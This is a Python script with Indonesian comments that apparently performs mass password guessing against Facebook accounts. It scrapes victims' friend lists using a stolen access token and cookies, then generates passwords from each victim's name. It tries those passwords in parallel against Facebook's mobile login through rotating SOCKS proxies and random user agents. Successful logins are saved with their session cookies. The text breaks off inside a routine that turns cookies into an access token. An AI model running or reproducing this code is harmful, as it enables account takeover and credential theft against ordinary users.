##------------------------------------------------------------------->
###hi gaes:) Hai bray🌝 Script ini 70% Hasil Recode Yaa, 
### jadi pastinya script ini 100% Free, 
###Tetap Bersyukur apa pun hasilnya yaa, okay
###------------------------------------------------------------------->

###------------------------------------------------------------------>
#     *JANGGAN DI PREMIN YA BANGSAD:)
###------------------------------------------------------------------>
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
import os, sys, re, time, requests, calendar, random, bs4, uuid, json, subprocess, base64
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
from concurrent.futures import ThreadPoolExecutor as thread
from concurrent.futures import ThreadPoolExecutor as tred
import requests,bs4,json,os,sys,random,datetime,time,re
from rich.markdown import Markdown as mark
from licensing.methods import Key, Helpers
from rich.columns import Columns as col
from bs4 import BeautifulSoup as parser
from rich.console import Console as sol
import requests,re,rich,sys,os,json,time
from bs4 import BeautifulSoup as sop
from rich.panel import Panel as panel
from rich.console import Group as gp
from bs4 import BeautifulSoup as par
from rich.panel import Panel as nel
from rich.columns import Columns
from rich.table import Table as me
from rich.console import Console
from rich.text import Text as tekz
from rich.progress import track
from rich import print as prints
from rich import print as cetak
from rich import print as rprint
from rich import print as cetak
from licensing.models import *
from rich.panel import Panel
from rich.table import Table
import urllib3,rich,base64
from rich.tree import Tree
from time import sleep
from rich import pretty
import itertools
import threading
import getpass
console = Console()
ses = requests.Session()
sound = []
login = []
babi = []
loop = 0
dump = []
memek = []
done = False
ualu,ualuh = [],[]
sys.stdout.write('\x1b]2; brazzer X haecerjoin\x07')
###------------------------------------------------------------------>
#     *CEK WARNA RANDOM
###------------------------------------------------------------------>
try:
	file_color = open("data/theme_color","r").read()
	color_text = file_color.split("|")[0]
	color_panel = file_color.split("|")[1,2]
	
except:
	junWik = "#00C8FF"
	stenly = "#FFFF00"
	mat = "#FFFFFF"
	fikri = "#00FF00"
	sabi = "#FF0000"
	color_panel = random.choice([stenly,mat])
###----------[ WARNA PRINT RICH ]---------- ###
tulisan=[]

M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
tulisan = random.choice([H2,K2,B2,P2])

try:
	import requests
except ImportError:
	prints(Panel(f"""{H2}• {P2}Modul requests Proses {H2}•""",width=55,padding=(0,12),style=f"{color_panel}"))
	os.system('pip install requests && pip install mechanize ')

try:
	import licensing
except ImportError:
	prints(Panel(f"""{H2}• {P2}Modul licensing Proses {H2}•""",width=55,padding=(0,12),style=f"{color_panel}"))
	os.system('pip install licensing')
	
try:
	import rich
except ImportError:
	prints(Panel(f"""{H2}• {P2}Modul rich Proses {H2}•""",width=55,padding=(0,15),style=f"{color_panel}"))
	os.system('pip install rich')

try:
	import stdiomask
except ImportError:
	prints(Panel(f"""{H2}• {P2}Modul stdiomask Proses {H2}•""",width=55,padding=(0,12),style=f"{color_panel}"))
	os.system('pip install stdiomask')
	
try:
	import flask
except ImportError:
	prints(Panel(f"""{H2}• {P2}Modul flask Proses {H2}•""",width=55,padding=(0,15),style=f"{color_panel}"))
	os.system('pip install flask')
	

###------------------------------------------------------------------>
#     *USER AGENT APPEND
###------------------------------------------------------------------>
id,id2,loop,ok,cp,akun,oprek,lisensiku,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[]
munculapk=['no']
cokbrut=[]
method = []
pwpluss,pwnya=[],[]
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
cokbrut=[]
dia=[]
say=[]
lisensikuni,lisensiku=[],[]
ses=requests.Session()
princp=[]
eist=[]
wa = Console()
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	cetak(panel('Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota'))
if sys.version_info.major != 3:
	exit(panel("[bold green] type: python b.py \n"))
	prox=open('.prox.txt','r').read().splitlines()

###------------------------------------------------------------------>
#     *CEK WARNA INPUT
###------------------------------------------------------------------>
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'	
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' 
m = '\x1b[1;91m' 
k = '\033[93m' 
h = '\x1b[1;92m' 
hh = '\033[32m' 
u = '\033[95m' 
kk = '\033[33m' 
b = '\33[1;96m' 
p = '\x1b[0;34m' 

###------------------------------------------------------------------>
#     *SETING USER-AGENT*
###------------------------------------------------------------------>
for xd in range(10000):
	aa='Mozilla/5.0 (Windows NT 10.0;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='WOW64)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/537.36 Vivaldi/6.0.2979.18'
	win=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	tle = random.choice([win])
	ugen.append(tle)
	ugen2.append(tle)
	
for t in range(10000):
	aa='Mozilla/5.0 (Windows NT 10.0;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='WOW64)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/537.36 Vivaldi/6.0.2979.18'
	win=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	tle = random.choice([win])
	ugen.append(tle)
	ugen2.append(tle)

for x in range(10000):
	aa='Mozilla/5.0 (Windows NT 10.0;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='WOW64)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/537.36 Vivaldi/6.0.2979.18'
	win=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	tle = random.choice([win])
	ugen.append(tle)
	ugen2.append(tle)
###------------------------------------------------------------------>
#     *GET TANGGAL-BULAN-TAHUN
###------------------------------------------------------------------>
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'December'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'PANDAXOK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'PANDAXCP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'


###------------------------------------------------------------------>
#     *MENU*
###------------------------------------------------------------------>

def menu():
	os.system("clear")
	print(f"banner")
	print('─'*30)
	print(" 01 : Crack Massal ")
	print(" 02 : Cek Results ")
	print(" 03 : Crack Folder ")
	print(" 04 : Remove cokies ")
	print(" 05 : Dump Public Id ")
	print('─'*30)
	haai = input("── > Choose : ")
	if haai in ('01','1'):
		mulai()
	if haai in ('02','2'):
		exit()
	if haai in ('03','3'):
		folder()
	if haai in ('04','4'):
		os.remove('PANDA-X/cokiku.txt');os.remove('PANDA-X/tokenku.txt')
		print("\n ╰─ >> \033[91;1mMengahpus Sesi Login Cokies..!", end='\r');time.sleep(0.9);print("  ", end='\r')
		exit()
	if haai in ('05','5'):
		dump_id()

#ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()


###------------------------------------------------------------------>
#     *CRACKK MASSAL*
###------------------------------------------------------------------>
def mulai():    
 try:
  token = open('PANDA-X/tokenku.txt','r').read()
  cok = open('PANDA-X/cokiku.txt','r').read()
 except IOError:
     exit()
 try:
  kumpulkan = int(input(f'\x1b[0m > Mau Berapa Id? : '))
 except ValueError:
     exit()
 if kumpulkan<1 or kumpulkan>1000:
     exit()
 ses=requests.Session()
 hitung = 0
 for JUNZXY_ in range(kumpulkan):
  hitung+=1
  taget = input(f'\x1b[0m -> TARGET :  '+str(hitung)+f' : ')
  uid.append(target)
 for user in uid:
     try:
        head = (
        {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
        })
        if len(id) == 0:
            params = (
            {
            'access_token': token,
            'fields': "friends"
            }           
        )
        else:
            params = (
            {
            'access_token': token,
            'fields': "friends"
            }            
        )
        url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
        for xr in url['friends']['data']:
            try:
                woy = (xr['id']+'|'+xr['name'])
                if woy in id:pass
                else:id.append(woy)
            except:continue
     except (KeyError,IOError):
       pass
     except requests.exceptions.ConnectionError:
         exit()
 try:
       print(" TERKUMPUL  : "+str(len(id))) 
       setting()
 except requests.exceptions.ConnectionError:
     exit()
 except (KeyError,IOError):
  exit()


def mulaii():
	try:
		token = open('PANDA-X/tokenku.txt','r').read()
		cok = open('PANDA-X/cokiku.txt','r').read()
	except IOError:
		exit()
	try:
		lah = int("1")
	except ValueError:
		print(' Opsh Terjadi Kesalahan.! ')
		exit()
	if lah<1 or lah>50:
		print(f'Masukan Yang Betul.!')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(lah):
		yz+=1
		print('─'*30)
		kl = input(f'{P}Target : ')
		print('─'*30)
		uid.append(kl)
	for junzid in uid:
		try:
			col = ses.get('https://graph.facebook.com/v13.0/'+junzid+'?fields=friends.limit(55555)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('>> Sinyal Loh Kek Kontoll ')
			exit()
	try:
		print('─'*30)
		print(f'Total '+str(len(id)))
		print('─'*30)
		setting()
	except requests.exceptions.ConnectionError:
		print(f'Sinyal kek Kontol ')
		back()
	except (KeyError,IOError):
		print(f'Pertemanan Tidak Public ')
		time.sleep(3)
		back()
		setting()

###------------------------------------------------------------------>
#     *CRACK FOLDER*
###------------------------------------------------------------------>
def folder():
	try:vin = os.listdir('/sdcard/JUNZ-DUMP')
	except FileNotFoundError:
		print('╰─ File Tidak Ditemukan ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print('╰─ Kamu Tidak Memiliki File Dump ')
		time.sleep(2)
		back()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/JUNZ-DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f' %s. %s ({h} %s{x} idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print('='*51)
				print('╰─ %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
				print('='*51)
		print('='*51)
		geeh = input('\n╰─ Chouse : ')
		print('='*51)
		try:geh = lol[geeh]
		except KeyError:
			print(f'╰─{k} Pilih Yang Bener Kontol {x}')
			time.sleep(3)
			back()
		try:lin = open('/sdcard/JUNZ-DUMP/'+geh,'r').read().splitlines()
		except:
			print('╰─ File Tidak Ditemukan, Coba Lagi Nanti ')
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
		setting()


def dump_id():		
	try:
		os.mkdir('dump')
	except:pass
	try:
		print('='*51)
		xaco = input(f"id public  :")
		print('='*51)
		print('='*51)
		cuy = input(f"nama file  :")
		print('='*51)
		wkwk  = ('DUMP/' + cuy + '.txt').replace(' ', '_')
		xxx = open(wkwk, 'w')
		token = open('PANDA-X/tokenku.txt','r').read()
		cookie = open('PANDA-X/cokiku.txt','r').read()
		coki = {"cookie":cookie}
		cyna = requests.get('https://graph.facebook.com/%s?fields=friends.limit(90000)&access_token=%s'%(xaco,token),cookies=coki).json()
		for fuck in cyna['friends']['data']:
			id.append(fuck['id']+'|'+fuck['name'])
			xxx.write(fuck['id']+'|'+fuck['name'] + '\n')
			sys.stdout.write(f'\r\033[0m   %s {H}•--->\033[0m%s                  \r\n\x1b[38;5;231m [ \x1b[38;5;46m%s\x1b[38;5;231m ] [ \x1b[38;5;46m%s\x1b[38;5;231m ] \x1b[0;96mSEDANG DUMP'%(fuck['id'],fuck['name'],['id'], len(id)
			)); sys.stdout.flush()
			time.sleep(0.0050)
			
		xxx.close()
		print('')
		print('='*51)
		print(f"berhasil dump id dari publik");print(f"salin output file + [ %s%s%s ]"%(H,wkwk,P))
		print('='*51)
		exit()
		os.system('python bws1.py')
	except (KeyError,IOError):
		os.remove(wkwk)
		print('='*51)
		print(f"gagal dump id, kemungkinan id tidak ada")
		print('='*51)
		exit()
###------------------------------------------------------------------>
#     *SETING METODE*
###------------------------------------------------------------------>
def setting():
	print('─'*30)
	##print(f'{x}1. Akun Old ')
	print('1. Akun Muda ')
	print('2. Akun Random ')
	print('─'*30)
	hu = input('└─ Pilih : ')
	if hu in ['1','01']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['2','02']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('>> Pilih Yang Bener Kontooll ')
		exit()
	print('─'*30)
	print('01. Mobile ')
	print('02. B-Api ')
	print('─'*30)
	hc = input('└─ Pilih : ')
	if hc in ['1','01']:
		method.append('mb')
	if hc in ['2','02']:
		method.append('ba')
	print('─'*30)
	pwplus=input('Tambahkan Password Manual ( Y/t ) ')
	print('─'*30)
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print('─'*30)
		print('Masukkan Katasandi Tambahan Minimal 6 Karakter\n Contoh : kakak,ngentod,adik')
		print('─'*30)
		print('─'*30)
		pwku=input('Masukkan Password Tambahan : ')
		print('─'*30)
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()


###------------------------------------------------------------------>
#     *SETING CRACK*
###------------------------------------------------------------------>
def passwrd():
	global prog,des
	urut = []
	print("")
	mekmek = Tree(Panel.fit(f"""{P2}Mode Pesawat Selama 4 Detik Setiap Crack 500 ID\nUntuk Menghidari Spam Ip di Device Kamu""",width=53,style=f"{color_panel}"))
	mekmek.add(Panel.fit(f"""[bold white]CP Save in [bold yellow]{cpc}""",style=f"{color_panel}"),guide_style="bold grey100")
	mekmek.add(Panel.fit(f"""[bold white]OK Save in [bold green]{okc}""",style=f"{color_panel}"),guide_style="bold grey100")
	prints(mekmek)
	wa.print(Columns(urut))
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'1')
						pwv.append(frs+'01')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'1')
						pwv.append(frs+'03')
						pwv.append(frs+'02')
						pwv.append(frs+'01')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						pwv.append(frs+'04')
						pwv.append(frs+'05')
						pwv.append(frs+'06')
						pwv.append(frs+'07')
						pwv.append(frs+'08')
						pwv.append(frs+'09')
						pwv.append(frs+'10')
						
						pwv.append(frs+'11')
						pwv.append(frs+'12')
						pwv.append(frs+'321')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				if 'ya' in pwpluss: 
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mb' in method:
					pool.submit(mb,idf,pwv)
				elif 'ba' in method:
					pool.submit(ba,idf,pwv)
		print('')
	os.popen('play-audio /sdcard/scmusic/bayy.mp3')       
	print(f'  {h}╰─ >>{x} Mendarat Denggan Selamat..')
	print(f'  {h}╰─ >>{x}{h} OK : {h}%s '%(ok))
	print(f'  {h}╰─ >>{x}{k} CP : {k}%s{x} '%(cp))
	print("")
	print(f'  {h}╰─ >>{x} Lanjut Crack Kembali ( Y/t ) ? ')
	pky = input(f'  {h}╰─ >>{x} Pilih : ')
	if pky in ['y','Y']:
		lologoku()
		junxua()
	else:
		print(f'\t{x}>>{k} Semoga Harimu Full Senyum:){x} << ')
		time.sleep(2)
		exit()
		
###------------------------------------------------------------------>
#     *METODE MBASIC.FACEBOOK*
###------------------------------------------------------------------>
def mb(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold white][[bold green]{loop}[bold white] / [bold green]{len(id)}[bold white]]-[OK - [bold green]{ok}[bold white]]:-:[CP - [bold yellow]{cp}[bold white]][/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fmbasic.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fmbasic.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in sound:
					#tree = Tree(Panel.fit(f"""[bold red] - {junzth(idf)} """,style=f"{color_panel}"),guide_style="bold grey100")
					#tree.add(Panel.fit(f"""[bold yellow]  {idf}|{pw}  """,style=f"{color_panel}"),guide_style="bold grey100")
					#prints(tree)
					print("")
					print(f"┗━━ {K}{idf}|{pw}{N}")
					open('PANDA-X/result-cp/'+cpc,'a').write(idf+'|'+pw+'\n')
					open('/sdcard/PANDA-X/result-cp/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
					break
				elif 'ya' in sound:
					os.popen('play-audio /sdcard/scmusic/cepe.mp3')       
					#tree = Tree(Panel.fit(f"""[bold red] - {junzth(idf)} """,style=f"{color_panel}"),guide_style="bold grey100")
					#tree.add(Panel.fit(f"""[bold yellow]  {idf}|{pw}  """,style=f"{color_panel}"),guide_style="bold grey100")
					#prints(tree)
					print("")
					print(f"┗━━ {K}{idf}|{pw}{N}")
					open('PANDA-X/result-cp/'+cpc,'a').write(idf+'|'+pw+'\n')
					open('/sdcard/PANDA-X/result-cp/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'ya' in sound:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					os.popen('play-audio /sdcard/scmusic/oke.mp3')       
					tree = Tree(Panel.fit(f"""[bold red] - {junzth(idf)} """,style=f"{color_panel}"),guide_style="bold grey100")
					tree.add(Panel.fit(f"""[bold green]  {idf}|{pw}  """,style=f"{color_panel}"),guide_style="bold grey100")
					prints(tree)
					print(f'\r{H}{kuki}{N}')
					print(f'\r{H}Safary;{ua}{N}')
					open('PANDA-X/result-ok/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					open('/sdcard/PANDA-X/result-ok/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(session,coki)
					break
				if 'no' in sound:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree = Tree(Panel.fit(f"""[bold red] - {junzth(idf)} """,style=f"{color_panel}"),guide_style="bold grey100")
					tree.add(Panel.fit(f"""[bold green]  {idf}|{pw}  """,style=f"{color_panel}"),guide_style="bold grey100")
					prints(tree)
					print(f'\r{H}{kuki}{N}')
					print(f'\r{H}Safary;{ua}{N}')
					open('PANDA-X/result-ok/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					open('/sdcard/PANDA-X/result-ok/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(session,coki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
	

###------------------------------------------------------------------>
#     *LOGIN COOKIES*
###------------------------------------------------------------------>

def login_dulu():
	try:
		print('─'*30)
		print("input your yokies")
		print('─'*30)
		your_cookies = input("── > : ")
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookies': your_cookies}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					print("\n ╰─ >> \033[91;1mCokiess Loo Kagak Berfungsi..", end='\r');time.sleep(3.5);print("                     ", end='\r');login_terus()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookies': your_cookies})
